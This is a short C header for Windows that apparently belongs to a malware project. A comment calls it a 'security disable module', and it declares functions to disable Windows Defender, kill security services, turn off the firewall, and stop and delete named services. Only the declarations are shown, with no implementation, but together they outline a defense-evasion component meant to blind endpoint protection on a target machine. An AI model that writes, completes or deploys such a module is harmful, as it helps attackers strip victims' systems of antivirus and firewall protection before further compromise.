#pragma once
#ifndef SECURITY_H
#define SECURITY_H
#include <windows.h>
#include <stdbool.h>

/* ============================================================
 * SECURITY DISABLE MODULE
 * Disables Windows Defender, firewall, and security services
 * ============================================================ */

/* Core Functions */
bool SecurityDisableDefender(void);
bool SecurityKillSecurityServices(void);
bool SecurityDisableFirewall(void);

/* Service Management */
bool SecurityManageService(const char *svcName, bool stop_and_delete);

#endif
